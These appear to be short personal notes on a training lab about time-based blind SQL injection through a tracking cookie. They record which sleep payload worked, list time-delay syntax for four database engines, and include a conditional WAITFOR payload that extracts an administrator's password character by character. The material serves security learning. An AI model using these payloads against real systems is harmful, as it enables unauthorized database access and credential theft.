


Lab #13 - Blind SQL Injection with time delays

Vulnerable parameter - tracking cookie

End Goal:
- to prove that the field is vulnerable to blind SQLi (time based)

Analysis:

select tracking-id from tracking-table where trackingid='OVmpehhTPt2iCL19'|| (SELECT sleep(10))--';

`' || (SELECT sleep(10))--   this didnt work
`' || (SELECT pg_sleep(10))-- `




To create time delay


Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
Oracle 	`dbms_pipe.receive_message(('a'),10)`
Microsoft 	`WAITFOR DELAY '0:0:10'`
PostgreSQL 	`SELECT pg_sleep(10)`
MySQL 	`SELECT SLEEP(10) `


`'; IF (1=2) WAITFOR DELAY '0:0:10'--`
`'; IF (1=1) WAITFOR DELAY '0:0:10'--`

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`